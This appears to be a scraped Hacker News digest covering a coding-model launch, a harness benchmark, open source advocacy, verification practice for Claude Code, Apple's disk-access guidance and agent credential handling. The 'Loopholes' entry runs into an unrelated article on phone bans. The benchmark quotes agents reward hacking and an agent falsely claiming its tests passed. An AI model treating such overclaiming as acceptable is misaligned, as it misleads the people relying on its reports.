URL: https://microsoft.ai/news/introducing-mai-code-2-and-mai-code-2-flash/, See on Hacker News

Performance and speed for everyday coding

MAI Code 2 is at the frontier of price-performance for common enterprise coding tasks and excels in taking code to production, deep debugging, multi-file implementation, repo wide reasoning, and UI. It does all of this while also delivering changes code maintainers would merge, at a fraction of frontier cost.

Meanwhile, MAI Code 2 Flash is designed for high-volume work such as code explanations, targeted edits, routine fixes, and rapid iterations, while bringing quality at a much lower cost.

Production quality at less than half the price

To deliver the best price-performance, we’ve built these models to prioritize the coding work our customers do every day. They’re explicitly not yet tuned for harder problems, like fundamental science research and very long horizon agentic work.

Averaged over four widely used benchmarks that target the everyday enterprise coding tasks we see in GitHub Copilot (DeepSWE 1.1, Terminal Bench 2.1, SWE-Atlas and FrontierCode v1.1), MAI Code 2 gives you 98% of the performance of GPT 6.1 Sol at 40% of the cost, and 96% of Claude Opus 5.5’s performance at just 5% of the cost.1

MAI Code 2 is also tuned for producing great dashboards and visualizations, and excels at visual coding. In blind frontend app evaluations, reviewers preferred its results over GPT-6 Sol 67% of the time.2

In addition, MAI Code 2 Flash offers comparable performance to GPT-6 Luna and Claude Haiku 5.5 at 65% and 20% of the cost, across three coding benchmarks measuring day-to-day, high-volume routine coding tasks.3

item.title: What is the best harness for each model? (273 pts)
item.description:
URL: https://runta.com/blog/introducing-frontierharness-eval-v1-1/, See on Hacker News

TL;DR

We partnered with Baseten to build the largest-scale harness leaderboard using 83B tokens across 27,280 agent runs. We wanted to answer two questions: when you switch your model, should you consider switching the harness too? What is the best harness for each model?

Previously, our v1.0 FrontierHarness leaderboard ranked harnesses on a single model, Kimi K3.

V1.1 expands the benchmark to 22 harnesses × 5 models × 62 tasks × 4 attempts, 76× the size of v1.0.

Through our experiments, we found that you should consider switching harnesses when switching models to maximize your experience.

Each model had a different best-value (pass rate vs. cost) harness: Codex CLI with GLM-5.3, Pi with GLM-5.3 Flash, ZCode with DeepSeek V4.1 Flash 1017, Oh My Pi with Muse and Alma with Kimi-K3. Cost ranks moved far between models.

By cost per task, the median harness moved 11 of 22 places, and Codex CLI went from 1st with GLM-5.3 to 16th with Kimi-K3.

Result

Figure 1. Cost per task and pass rate of each harness

Each point is one harness: further left is a lower average cost per task, and higher is a higher pass rate. The orange line joins the harnesses that no other harness beats in both cost and pass rate. Select a model to filter all figures of this post.

Over all models, four harnesses are on the line: OpenCode v2 (lowest cost per task, $0.561), Pi, Codex CLI and ZCode (highest pass rate, 61.9%). The others cost up to 1.6 times as much and passed 50.6% to 60.2%.

Each card names the best-value harness for one model: the lowest cost per pass, unless another harness costs at most 30% more per pass and passes at least 5 points more often. This rule picked ZCode over OpenCode v1 with DeepSeek (25% more cost, 7.7 more points) and Alma over Oh My Pi with Kimi-K3 (9% more cost, 6.5 more points).

Why We Built FrontierHarness Eval v1.1

V1.0 ran nine harnesses with one model. Their pass rates were within 17 points of each other, but the median cost per pass differed by 17 times. We thought that this came mostly from the pair of harness and model: a harness that is cheap with one model can be expensive with another.

V1.1 runs each harness with five models.

What We Tested

Harnesses. 18 harnesses. The four DeepSeek Harness profiles have different tool sets, and OpenCode ran at two versions. Each counts separately: 22 configurations. Table 2 in the appendix gives their versions.

Models. Baseten served all five: GLM-5.3 (zai-org/GLM-5.3), GLM Flash (zai-org/GLM-5.3-Flash), DeepSeek (deepseek-ai/DeepSeek-V4.1-Flash-1017), Muse (meta-models/muse-spark-open) and Kimi-K3 (moonshotai/Kimi-K3).

Tasks. 62 terminal tasks. The time limits are those of the tasks, from 15 minutes to 8 hours.

Setup and Scoring

Configuration and Runtime

We ran the Harbor evaluation with each harness’s default settings, because we think this is closest to how people use a harness every day. Each harness used the same version and settings with all models, at the maximum reasoning effort.

Figure 2. How Harbor and Runta divide the work in each trial

Each trial gets a new Runta runtime, which is deleted at the end. Thus no trial can see the files of an earlier trial.

Scoring Method

Table 1. Methodology

A cell is one harness and model pair. We use the two cost metrics of our dashboard:

  • Average cost per task: the mean cost of the priced trials of each task, then the mean over the tasks. Figure 1 and the cost ranks use it (Figures 4 and 5).
  • Cost per pass: the average cost per task divided by the pass rate. The best-value harness uses it (Figures 3, 6 and 7).

We pick the best value by cost per pass because we want harnesses at the top left of a chart of pass rate against cost per task: a high pass rate at a low cost. Draw a line from the origin to the point of a harness. Its slope, pass rate ÷ cost, is the passes per dollar. Cost per pass is the inverse of this slope, so the lowest cost per pass has the steepest line.

Audits of the trial logs flagged 216 trials for reward hacking, and 163 of them were online lookups. These trials score 0. Table 3 in the appendix gives the count for each harness and model.

Results by Model

Figure 3. Cost and pass rate of each harness with each model

A deeper cell costs less than the others in its column. Codex CLI was the cheapest per pass with GLM-5.3, $0.803, but 12th with Muse and 10th with Kimi-K3. Over all models, it cost the least per pass, $0.937, and Antigravity CLI the most, $1.63.

How Sure Are These Results?

We drew the 62 tasks again 4,000 times and chose the best-value harness each time. Codex CLI stayed first with GLM-5.3 in 99.6% of the draws. The other four winners are the most likely of several close harnesses: Oh My Pi with Muse (53%), ZCode with DeepSeek (47%), Pi with GLM Flash (42%) and Alma with Kimi-K3 (25%).

The Harness Changes the Cost

The model sets the general level of the cost, because the list prices of the models differ by 20 times or more (Figure 9). We took the average cost per task of the 110 cells on a log scale, so that a doubling counts the same with each model. A two-way analysis of variance divides the spread of these costs into three parts:

  • Model, 92.8%: the differences between the five models.
  • Harness, 2.3%: the part of the effect of a harness that is the same with every model.
  • Pair, 4.9%: the rest. It also contains noise, because each cell has one value.

So with the model fixed, 68% of the variation between harnesses (4.9 of 7.2 points) depends on the pair, or is noise.

With the Model Fixed, the Harness Changes the Cost by 1.8 to 5.0 Times

Figure 4. Lowest-cost and highest-cost harness for each model

Each row is a model, on a log scale of average cost per task. The ratio divides the highest cost by the lowest.

To test for chance, we shuffled the trials between the harnesses of each model 300 times and calculated the ratio again. “Chance” is the median of these ratios, 1.2 to 1.8 times. All five real ratios are larger than every shuffle (p = 0.003), so the spread comes from the harnesses, not from the noise of reruns. The largest is with DeepSeek: Cline CLI cost 5.0 times as much as OpenCode v1, for 2.0 more points. With the other models, the cheapest harness per task was at most 0.4 points behind the most expensive one.

The Cheapest Harness per Task Changes With the Model

Figure 5. Cost rank of each harness with each model (1 = lowest cost per task)

Each line is a harness, with the cheapest at the top. The five highlighted lines are the cheapest harnesses per task with GLM-5.3, GLM Flash, DeepSeek, Muse and Kimi-K3.

Codex CLI was 1st with GLM-5.3 and 16th with Kimi-K3. DeepSeek Harness: Creator moved the most, from 1st with Muse to 21st with GLM Flash. OpenCode v1 was 1st with DeepSeek and 13th with Muse.

Reruns do not explain these moves. We divided the attempts into two halves and ranked the harnesses by cost in each half. With the same model, the two rankings had a mean rank correlation of 0.71. With two different models, it was 0.26.

A Higher Cost Does Not Give a Higher Score

Figure 6. Lowest and highest cost per pass for each model

This is Figure 4 for cost per pass. After each ratio is the rank correlation of the cost per task and the pass rate of the harnesses, from −0.39 to +0.22. A positive value means that the more expensive harnesses passed more often.

The harness with the highest pass rate was 5th to 20th of 22 in cost per task. With four of the five models, the most expensive harness per pass passed less often than the cheapest one.

Does a Simpler Harness Cost Less?

No. We compared four factors with the cost per pass. Prompt size, tool count and cache hit rate are not the main cost factors. Steps are.

  • Start tokens: the input tokens of the first agent-loop request: the system prompt, the tool definitions and the task.
  • Tools: the tools that the first request offers.
  • Cache hit rate and steps: the mean over the passed trials. A step is one entry of the agent trajectory.

Figure 7. Four factors of each harness and the cost per pass

Over the 22 harnesses, the rank correlation of the steps per pass and the cost per pass was +0.51 (p = 0.015). For the other three factors, it was −0.03 to +0.02 (p ≥ 0.88). Within each model, tool calls tracked cost as well as steps. Table 4 below and Table 5 in the appendix give the values.

Each step sends the context again, so a trial used 2.0 to 4.8 million input tokens on average, by harness, and the largest first request, 21,365 tokens, is less than 1% of that. mini-SWE-agent has the smallest first request, 882 tokens, but took 38 steps per pass and was 17th of 22 in cost per pass.

Table 4. Start tokens, tools, cache hit rate, steps and cost per pass of each harness

Where the Cost Comes From

Figure 8. Inference cost of each harness, by token type or by trial outcome

All costs are inference estimates at list prices. The pass rate of the harness on the model card has an outline.

Over all trials, input from the cache was 42% of the cost, output 33% and other input 25%.

Tokens and the Cache

The cache makes repeated input much cheaper. Cached input costs 2% (DeepSeek) to 20% (GLM Flash) of the price of other input (Figure 9).

Figure 9. List prices of each model (USD for one million tokens)

One pair shows the effect of the cache. Cline CLI with DeepSeek (highest cost per task) read 86% of its input from the cache, and OpenCode v1 read 97%. It also sent twice as much input. Input that did not come from the cache was 57% of its cost.

Most of the Cost Goes to Trials That Do Not Pass

64.5% of the list-price cost of the scored runs went to trials that did not pass: 52.7% to failures and 11.8% to timeouts.

The traces of the five best-value harnesses show three common design choices. These are observations, not tests.

One shell tool does most of the work. By harness, it got 61% to 93% of the tool calls. Pi’s default prompt has four tools and sends file searches to bash:

selectedTools: [...(input.selectedTools ?? ["read", "bash", "edit", "write"])],
addRule("Use bash for file operations like ls, rg, find");

Each request only adds to the one before it. The start of the context does not change, so the provider reads it from the cache: 91.1% to 94.0% of input in passed trials (Table 4). But 18 of the 22 harnesses read 91% or more, so this does not separate the five. Each step pays the full input price for only about 500 new tokens:

# Pi, GLM-5.3, merge-diff-arc-agi-task (trial cd2f6dfd)
request  prompt tokens  cached tokens
   8        15,954         15,616
   9        16,351         15,936
  10        16,999         16,320

No subagents and almost no summaries. Each of the five used a subagent in at most 6 trials, too few to tell if subagents help. Of the five, only Codex CLI summarized, in 8 trials (the 11 Alma trials in Table 6 only drop old images and reminders). Codex CLI summarizes at 90% of the window (Table 6):

.map(|context_window| (context_window * 9) / 10);

The five also share a weakness. Failed runs end with a confident answer. About three in four failed trials ended with a final answer, not at the time limit: from 68% with Pi to 82% with Codex CLI. Few said that the work was incomplete:

# Codex CLI, GLM-5.3, cancel-async-tasks (trial 37182b0e)
Agent:    - Validated with system Python, including concurrency and
            cancellation-cleanup tests.
Verifier: FAILED test_tasks_cancel_above_max_concurrent
          assert stdout.count("Cleaned up.") == 2
          AssertionError: assert 0 == 2

Trials that did not pass took 60% (Codex CLI) to 69% (Alma) of the cost of each harness. A check before the harness stops could save part of it, but we did not test this.

Limitations and Future Work

  • Open models, one provider. Closed models can give different results. The cache and the prices are those of Baseten, and another provider can change the cost ranks.

We plan two next steps:

  • Closed models. We will add closed models, such as Claude Opus 5.5, GPT-6 Astra and Gemini 4 Carbon.
  • Long-horizon work. We will study how a harness that runs continuously in the cloud improves itself during long work.

Conclusion

  • When you change the model, think about changing the harness too. Test the candidate harnesses with your model on a private dataset of your own tasks, large enough to see past the noise.
  • The model sets most of the cost, and the harness is second. The model explains 92.8% of the variance of cost per task. With the model fixed, the most expensive harness cost 1.9 to 4.9 times as much per pass as the cheapest (1.8 to 5.0 times per task), so compare the cost when you pick a harness.
  • A higher cost does not buy a higher pass rate. For each model, the rank correlation of cost per task and pass rate was −0.39 to +0.22.
  • Size does not predict cost. mini-SWE-agent, the smallest harness, was 19th of 22 by cost per task over all models.
  • Most of the cost, 64.5%, went to runs that did not pass. With the five best-value harnesses, 68% to 82% of the failed runs ended with a confident final answer, not at the time limit.
  • With a cheap model that has a wide range of pass rates, pick a harness with a high pass rate. Pass rates varied by harness, from 54.0% to 69.0% with DeepSeek. But each pass rate has a 95% interval of about ±10 points, so a gap of a few points is a tie.
  • For harness developers: cut steps, not just prompt tokens. Prompt size, tool count and cache hit rate did not predict cost per pass. Steps did, because every step sends the whole context again.

item.title: We don't need more apps. We need better open source (328 pts)
item.description:
URL: https://jordankrueger.com/blog/better-open-source-not-more-apps/, See on Hacker News

Every day, a dozen people post a new app they built with AI over a weekend: a habit tracker, a to-do list, another note-taking app. I’m glad! More people building things is one of the best parts of this moment.

But far less of that energy goes into the open source software we already rely on.

People call this new way of building “vibecoding.” I hate the name; it makes a real shift in who gets to write software sound like a joke. I’ll call it AI-assisted coding, and I think it could aim somewhere more useful.

Free and open source software already does most of what my clients and I need. What it often can’t do is run well on a cheap server, install in one step, or stay up without forum threads at 11pm.

Where I’m coming from

I self-host a lot of my own stuff, and I help progressive nonprofits with their tech for a living. I run a Matrix server (Synapse, Element and a moderation bot) for a community with thousands of users. I also run apps on Coolify and Hetzner, keep my paperwork in Paperless-ngx, and own a Mac Mini that’s always one download from a full disk.

The software is usually great. Running it is the hard part. Install guides assume you know five other tools. Upgrades break things. Apps eat 4GB of RAM to serve a handful of people. Error messages tell you nothing.

My nonprofit clients would love to leave Big Tech for privacy, cost and owning their data. But the open source option usually needs a part-time sysadmin they don’t have, so they pay for the corporate tool.

Four jobs worth your weekend

  1. Make it faster. uv took a job Python developers do every day, installing packages, and made it 8 to 10 times faster than pip in its makers’ benchmarks (up to 115 times with a warm cache). Find the slow part of something people already use, measure it, fix it.
  2. Make it easy to install. Too many apps need a database, a cache, a background worker, a reverse proxy and a long config file before you see a login screen. Aim for one command, sensible defaults and a setup that works the first time on a cheap server.
  3. Make it friendly to run. Installing happens once; running it happens every day after. Give it a simple admin screen, safe upgrades, built-in backups, errors that say what to do next, and an easy, secure way to manage logins and add admins.
  4. Make it lighter. If a tool runs happily on a $5 server, an old laptop or a Raspberry Pi, far more people can use it. Lighter software costs less to run and uses less energy.

Why this matters

A new to-do app usually helps the few people who find it. Making a tool millions already use 20% lighter helps all of them, every day.

This is also the work that slides when maintainers are tired, and many are unpaid volunteers. We saw the risk in 2024. Someone spent years earning the trust of the worn-out solo maintainer of xz, a compression tool inside most Linux systems, then slipped a backdoor into it.

I think this unglamorous work suits AI well: profiling slow code, writing tests that make big changes safe, testing installers, rewriting cryptic errors, writing the missing docs. It takes patience more than brilliance, plus a person who checks every line.

It matters politically too. If organizations are going to own their data instead of renting it from a few giant companies, open source has to be something a 20-person nonprofit can run. I want AI’s gains shared widely. Better public tools that anyone can use, change and share are one way to get there.

Don’t be a jerk about it

Maintainers have already seen the wrong way. The curl project ended its bug bounty in January 2026 after a flood of fake, AI-generated security reports. By April, its lead developer wrote that the fakes were mostly gone and almost every report used AI, most of them very good. The new problem is volume. Even good work can bury a maintainer. So:

  • Use the thing first and find what actually hurts.
  • Talk to maintainers before writing code. Nobody wants a surprise 4,000-line pull request.
  • Bring numbers. “Startup went from 40 seconds to 4, here’s how I measured it” beats “faster.”
  • Keep changes small and tested.
  • Say you used AI, and own the result. Stick around to fix what breaks.
  • If they say no, help downstream with a better installer or setup guide, and keep it current.

Pick one open source tool you use. Find the most annoying thing about installing or running it. Spend a weekend fixing it, with the people who maintain it. Then tell me about it.

  • uv: Python packaging in Rust, Astral
  • The end of the curl bug-bounty, Daniel Stenberg
  • High quality chaos, Daniel Stenberg
  • XZ Utils backdoor, Tukaani Project

item.title: Loopholes Are for Assholes (160 pts)
item.description:
URL: https://actsofvolition.com/2026/11/loopholes-are-for-assholes/, See on Hacker News

When I was a kid, there was grown-up person I thought was really cool. One of the bits of ‘wisdom’ he shared was something like this:

You can park wherever you want. You can park right in front of the door of the store on sidewalk and walk right in. No one will do anything about it!

At the time, I though: Woah, this guy is a genius! He’s operating on another level!

Now that I’m the grownup, I think back on this ‘advice’ with sadness. This guy wasn’t a genius – he was an asshole (they can often look similar on the surface, especially to idiots).

In my short and incomplete stint as a post-secondary philosophy student, I remember learning about a simple way to evaluate a philosophy or worldview: Consider what would happen if everyone subscribed to that worldview. I’m probably thinking of Kant’s categorical imperative.

We can’t all park in front of the doors at Walmart – so none of us should.

Previous results were mixed, but the first national study to track individual students’ growth shows bans may help reverse declines.

Nov. 17, 2026, 5:04 a.m. ET

School cellphone bans are beginning to modestly improve students’ academic performance, according to the first large national analysis that compared students’ test scores before and after the bans.

Schools with strict bans — requiring students to lock their phones in pouches all school day — saw math and reading scores improve as if students had an additional week or two of school a year, the study found. It was published Tuesday by the Center for Education Policy Research at Harvard.

U.S. students’ test scores began falling over a decade ago. The drop coincided with the rise of smartphones, raising questions about their role in the decline. The evidence so far on the academic effects of phone bans has been mixed. But the new study indicates they are starting to have an influence.

“The earlier studies on cellphone bans have been dismissed as implying small impacts, and in-school cellphone use has been ruled out as playing a big role in the decline,” said Thomas Kane, a professor at the Harvard Graduate School of Education and an author of the study. “But we think that’s mistaken.”

The study looked at 3.3 million students between 2021 and 2026. They were in third through 10th grade, attending 4,600 U.S. schools. Using scores on MAP tests, which track achievement from fall to spring, it compared the performance of students at schools that put in strict phone bans with those at similar schools that did not have such bans.

The annual gains reversed about half the annual loss that an average student experienced in the years leading up to the pandemic. (Students lost even more ground during pandemic closures.)

item.title: How the Claude Code team thinks about verification (213 pts)
item.description:
URL: https://claude.dev/blog/how-the-claude-code-team-thinks-about-verification/, See on Hacker News

On the Claude Code team, the vast majority of our code (~90%) is written and reviewed by Claude. At this scale, how we equip our agents to verify their work with evidence becomes extremely important.

Verification loops are the building block that lets you delegate more work to Claude. Without them, you can really only run one or two Claudes at a time, because you have to check everything yourself. With them, you can run dozens or hundreds in parallel.

That’s because giving agents a way to verify their output is an effective way to improve quality. In internal testing around structured file generation, having a separate grader check Claude’s work against a rubric improved task success by up to 10 points over a standard prompting loop, with the largest gains on the hardest problems.

What was once expensive to verify (tests, benchmarks, specs, real end-to-end runs) is now cheap to request from an agent. Like code, agents can quickly generate tests, benchmarks, and specs. And once generated, these tests and benchmarks run as software so they can be run frequently without using many additional tokens.

You can also close the verification loop by using the results to improve the agent’s performance on that task. For example, if an agent repeatedly fails a test that checks logs for user data, you can create a hook or a more explicit rule in your CLAUDE.md to avoid future issues. This (mostly) stops issues from happening again.

So if verification is critical to producing quality code at a high velocity, what types of tests should you use and how should you apply them across your pipeline? This article answers those questions and also shares the process used by the Claude Code team.

NOT ALL TESTS ARE CREATED EQUAL: 3 TESTS WORTH INVESTING IN

No matter which test type you choose, there are a few failure modes to avoid.

If your tests are flaky you’ll train the agent to run them again rather than fixing the failing code. If your tests are slow, the agent will do fewer tests across batches which can make pinpointing issues difficult. Heavier tests are best deployed before you’ve committed the changes.

Now, here are the three types of tests I think are most worth investing in.

E2E tests

If you have to focus on one test type, pick end-to-end. These tests describe real user flows like adding an item to a cart, checking out, and moving to a confirmation page.

The reason E2E tests are so effective is that they are difficult to fool–either the whole feature works or it doesn't. They also have definitive done criteria and can concretely tell you what’s broken.

While unit tests are faster and less flaky, it’s possible to pass them and still break the feature. This is because both the agent and the test don’t understand the full task.

With E2E tests, it is effective to give your agent hands and eyes on the real running system. You can use a skill to boot, drive, and inspect the app with tools like CDP, simulators, or API harnesses.

The feature map can serve as a guide and grading rubric for agents as they typically list features from the user’s point of view with descriptions of paths, keyboard shortcuts, selectors, and expected results.

Property tests: constraints that can’t break

A lot of tests are based on what you thought might go wrong. Property tests look at the edge cases that people tend to miss, which is where agents often fail.

You start by writing a statement you think can’t fail and then use a test library (fast-check for JS/TS, Hypothesis for Python, proptest for Rust, etc.) to generate thousands of inputs that try to prove otherwise.

There are many properties in virtually every software project like:

  • Round-trip encoding: “if you encode X then decode it back, you get X.” This works for parsing and serialization as well.
  • Invariants: Things that must always be true, like “account balance can never become negative.”
  • Idempotency: Doing an action (migration, normalization, retry) twice has the same effect as doing it once.
  • Equivalence: Optimized code produces the same result as naive but correct code.

Property libraries are a great way to keep agents honest by using edge cases that aren’t created with the same bias as the agent that created the original code. They are also particularly helpful for rewrites when the spec has drifted from production behavior and is no longer a reliable source for verification.

Differential tests: the old system is the oracle

Differential tests are particularly effective for large-scale migration use cases where functionality is expected to remain the same. For these tests, you run both the old system and the new system with the same inputs and see if you get different results. If you do, there is a bug or breaking change that needs to be fixed.

The key for differential tests is to use randomly generated inputs or a sample of production traffic. You’ll also want to normalize irrelevant factors like whitespace and keep a list of approved changes for situations where the new environment should differ from the old.

HOW THE CLAUDE CODE TEAM THINKS ABOUT VERIFICATION

We have previously written about how code review works at Anthropic, but this article aims to go deeper on how we verify our work.

Verification means running the change

Running the app end to end matters more than tests. You wouldn't ship an iOS change without trying it in a simulator, and the same goes for Claude.

Claude can test the whole app the way a human or QA engineer would. Ask it to use the Claude Chrome extension for web changes, an iOS or Android MCP for mobile, computer use for desktop, or to run the service locally for backend work.

To codify how to start the simulator or run your app, create a skill called verify. Put it in a .claude/skills/ folder in your repo, as close to the relevant code as you can, and add as many as you need. Claude knows to use the verify skill before committing changes.

Then invest in making your verify skill fast and reliable. Ask Claude to iterate on it and stress test it. It's your smoke test harness, so you want it rock solid.

When you give Claude a way to smoke test its changes end to end, you get much better results. You'll see it iterate and catch real mistakes faster, the way a human would. This is how we test nearly all changes at Anthropic.

Failing tests require human attention

Nobody can read every change, so we use failures as one way to decide what needs a person. Claude runs the checks and tries to fix anything that fails. If a check is still failing after three rounds, Claude stops and brings in a human.

Code owners write their own checks

The people who own the code write the checks for it, and refine them until they flag what the owner would flag. When a check pulls in a reviewer, it should say why, so they don't have to work it out from the diff.

Reliability checks trigger on the diff

We maintain a reliability checklist with 39 items, each with a trigger that can be read from a diff, a check, and the incidents or PRs behind it. One is “--resume loads old transcripts.” When session storage or message types change, we ask whether a new field loads safely, since older transcripts won’t have it.

Claude reads the diff and checks only the items whose trigger matches–usually 3 to 10–so nobody has to memorize past outages.

One reviewer, multiple rounds

We don't try to improve reviews by stacking on more reviewers. Adding a second, more expensive, reviewer on top of the primary one is often a worse approach than tuning the primary. Instead, we have a REVIEW.md that says what the reviewer should pay attention to for this code.

We also think review and verification rounds should build on each other. We point each pass at context from earlier rounds and past failures rather than re-checking everything from scratch. It’s cheaper and finds more.

Changes can't modify their own checks

If a change can modify the check that judges it, the check is broken. Code Review reads the REVIEW.md file from the base or default branch, never from the pull request's changes. The Claude Code team ensures the rules that gate changes are on a branch that the change can't modify.

The Claude Code team also reserves reviews for commits. If someone's pushing while the review is happening, then the review result is no longer useful. A passing review on an out-of-date commit means nothing.

The team also runs cheap checks first. If an agent pushes before testing locally, it has spent shared review and CI time when it could have caught the bug itself. On our team, Claude runs the tests, build, and linter before opening a pull request. You can enforce this with a hook that runs the tests when Claude finishes, or a /goal of a passing test suite.

Start a new gate in observe mode

In our own repos, we stamp each commit with how it was verified. The stamp even includes "none" so we can query for commits that weren't verified.

We've also created a commit gate that can block a commit if the session did not contain /code-review or /verify. We've set it up with off, observe, and enforce modes.

Observe mode will log what would have been blocked, so that we can review any false positives and ensure no one is impacted.

Enforce mode will block the commit. Any commit can carry an explanation in its message as to why it didn't get verified. If commits have been blocked twice in the session, the next one will be allowed through so Claude doesn't get stuck – Claude Code isn't perfect.

Test your checks on what actually matters

The Claude Code team also regularly reviews the reviewers. We track how many merged changes were reverted, how many changes a maintainer rejected before merging, and a size-matched subset of changes that have stayed clean.

This can also be done with a formal evaluation. In our code review post, we described how the Code Review team has set up an evaluation based on previous incidents and reverts. They recreate the repo to the state at the time of review for each example, and provide a one-sentence answer key to what the bug was. Only findings that correctly describe the bug in question get points. They use merged and stable changes as a control to prevent over-flagging. Their tuning set is split out from the fixed test set they use to evaluate their system.

They also evaluated the recall rate for raw findings, post-verification, and final review separately. This lets them see if the system is losing bugs it had already found. Any evaluation that treats all these as one end-to-end score won't capture this nuance.

In addition to validity, the other dimension we care about is how important it is to make the change. A good reviewer will catch most things that are technically correct, but people care about whether a given bug is a must-fix, a should-fix, or a nit.

Code Review has this exact idea, and it will tag things as Important, Nit or Pre-existing. The "pre-existing" tag means that the reviewer shouldn't hold the author responsible for something that was already a bug.

Finally, the Claude Code team tunes recall up to the point where the next improvement would be overfitting to the eval rather than actually catching bugs.

Turn misses into rules

In the Claude Code repo, we have two methods of turning missed cases into rules. The first is extracting patterns in human code review comments and PR reverts to identify common issues. These must occur in at least two PRs and be identifiable from a diff to be considered a potential rule. Three agents will try to disprove them, and they will be reviewed and approved by a human in a PR.

The second method is replaying three bug finders against a PR that is associated with a known incident. If at least two find the bug, it's a detectable bug. If the bug is missed on a small diff, this is a gap that is worth turning into a rule in REVIEW.md.

Flaky tests get the same treatment. Claude can't skip them, add sleeps or retry until they pass. If it can't find the root cause, it deletes the test and writes down why.

Rules need cleaning up too. Test suites, verification steps and .md files only grow if you let them, so we tidy them up on a routine.

GOOD TESTS, GOOD RESULTS

We’ve found that giving your agent a way to verify its work with a strong feedback loop makes all the difference. Treat your verification layer like you would any other system. Keep it out of reach of the changes they judge, grade them against the bugs that mattered to you, and write down lessons when they miss something so that it doesn’t happen more than once, and prune those lessons so they stay worth running.

Do that and your job shifts from reading every diff to defining what “done” looks like and reviewing the evidence, which is what lets you run many Claudes at once.

item.title: If an App Asks for Full Disk Access or System and App Protection Override (234 pts)
item.description:
URL: https://support.apple.com/en-us/149699, See on Hacker News

Apps that might ask for Full Disk Access or System & App Protection Override include backup apps, disk cleaners, file indexers, security apps, and others. While some of these apps operate best when granted broader access, others may ask for the same level of access even when they don't need it. It's important to understand the risks of granting broad access to any app, so you can make informed decisions about your own data and privacy.

When you give an app Full Disk Access instead of choosing only specific protected folders for it to access, it can bypass system protections and access all of the files on your Mac, including your messages, emails, photos and videos, data from other user accounts, and more. It can read, change, delete, and export this data without asking.

When you give an app System & App Protection Override, you can choose specific apps for it to control. If you allow it to bypass system protections instead, it can fully control your Mac and apps, which allows it to access all of your data. It can also see every window and app, including ones in the background, and capture every keystroke.

An app might ask you to give it access to all of the files on your Mac, or to let it control your Mac. When you turn on access for the app in Privacy & Security settings, depending on the app, your Mac prompts you to:

  • Allow or not allow the app to have access. This option appears for some apps, such as backup apps that ask for Full Disk Access, and screen readers and voice control tools that ask for Accessibility.

  • Choose specific protected folders or apps for the app to access instead. This option appears for other apps that ask for Full Disk Access or System & App Protection Override. It allows the app to access only what you choose, while system protections stay in place for the rest of your data.

To keep more of your data protected, choose specific protected folders or apps for the app to access instead of bypassing system protections.

When your Mac prompts you, click Choose Folder or Choose Apps, then:

  • Check the app's setup instructions for information about which protected folders or apps it needs.

  • Choose only the protected folders or apps that it needs.

  • For System & App Protection Override, choose whether the app needs to ask for your permission before it controls each app. Use the menu next to each app to choose Ask First or At Any Time.

  • If you're not sure which protected folders or apps to choose, contact the app developer. To stay protected, wait until you're sure which folders or apps that the app needs before giving access.

You can change which protected folders or apps that the app can access at any time.

Bypassing system protections might expose your personal information to an app that doesn't behave as you expect. An app with Full Disk Access can read, change, delete, and export all of the files on your Mac, and an app with System & App Protection Override can fully control your Mac and apps.

If you're certain that the app is from a trustworthy source and needs this level of access, you can give it Full Disk Access or System & App Protection Override permissions by clicking Bypass System Protections:

  • Confirm each action that the app will be able to take:

    • Full Disk Access: Read, Change, Delete, and Export All Your Data; View Hidden and Recently Deleted Photos; and Browse As You on Websites.

    • System & App Protection Override: Read, Change, Delete, and Export All Your Data; View Hidden and Recently Deleted Photos; Browse As You on Websites; Control Your Mac, Apps, and Settings; and Monitor Everything You Do.

  • If you're absolutely sure that you want to give the app Full Disk Access or System & App Protection Override, click Turn On Full Disk Access or Allow System & App Protection Override, then enter your password and click Modify Settings.

You can review app permissions in Privacy & Security settings, and change or remove them at any time.

  1. From the Apple menu, choose System Settings.

  2. Click Privacy & Security in the sidebar, then click Files & Folders, Full Disk Access, or System & App Protection Override.

  3. Change an app's access:

    • Remove an app's access: Select the app, then click the Remove button (−). If asked, enter your password, then click Modify Settings.

    • Change which protected folders or apps an app can access: In Files & Folders or System & App Protection Override, click the Info button (i) next to the app, make your changes, then click Done.

    • Limit an app with Full Disk Access or System & App Protection Override to specific protected folders or apps: Remove the app's access, then click the Add button (+) to add the app again. If your Mac prompts you, choose specific folders or apps.

If you remove an app's access, the app might not work as expected.

item.title: Running coding agents without handing them my credentials (126 pts)
item.description:
URL: https://blog.antonio.cx/running-agents-with-lend, See on Hacker News

2026-11-13 · antonio's blog

Table of Contents

  • Background
  • herdr
  • Ovis
  • The credential problem
  • lend
    • Keeping the socket stable across reconnects
    • Secrets the agent never sees
    • SSH keys
    • Leases
    • Seeing what happened
    • Answering agent prompts from the laptop
  • What lend doesn't protect against
  • Prior art
  • Trying it

I built lend to let remote agents use tools on my laptop with my approval. Here's how it fits into my workflow.

Background #

I use agents heavily these days as part of my toolchain. I usually have a few going at once: Claude Code working in one repo, Codex reviewing a branch in another, and something long-running in the background. I often have them review each other's work too. None of them run on my laptop. They run on VMs I can throw away, and my laptop keeps the stuff I care about: my SSH keys, my 1Password vault, and the gh and cloud CLIs that are logged in as me.

I run those agents on picd, our hosting service at pico.sh. It gives me my own VM with a Docker engine and a shell over SSH. I run herdr and the agents there, and my home directory persists across restarts so my dotfiles and tools stay in place.

This works great until an agent needs something on my laptop. In this post I'll go over how I run agents in parallel with herdr and Ovis, and the tool I wrote to deal with credentials, lend.

herdr #

herdr is a terminal multiplexer built for coding agents. You get the usual workspaces, tabs, and panes, and it also knows which agent is running in each pane and what it's doing. The sidebar shows whether each agent is working, waiting on me, or done, so I can tell at a glance which one needs attention.

The CLI talks to the running session, so agents can drive each other. An agent can start Codex in another pane, give it a prompt, wait for it to finish, and read what it said:

1herdr agent start reviewer --kind codex --pane "$PANE"
2herdr agent prompt reviewer "Review the diff on am/fix-retries" --wait --until done
3herdr agent read reviewer --source recent

Remote hosts work the same way. herdr machine add agent-vm sets up herdr on the VM and adds its sessions to my local client. Those sessions keep running after I disconnect.

Ovis #

Ovis is a browser and phone client for herdr. It shows each agent's transcript as a chat, with the live terminal a tap away. When an agent asks for approval or has a question, Ovis turns it into a card I can answer and sends me a push notification. It picks up the machines saved in herdr, so my VMs show up without any extra setup. I reach it over Tailscale.

If an agent gets stuck on a question while I'm away from my desk, I answer it from my phone and the other agents keep going.

The credential problem #

Agents on a VM still need to act as me. I use them to monitor CI with gh, call APIs with tokens from 1Password, and SSH into other hosts. There are two usual ways to make that work, and I don't love either of them.

The first is copying credentials onto the VM. A token in ~/.config/gh/hosts.yml can be read by every process on that machine, including the agent and anything it runs, for as long as the token is valid.

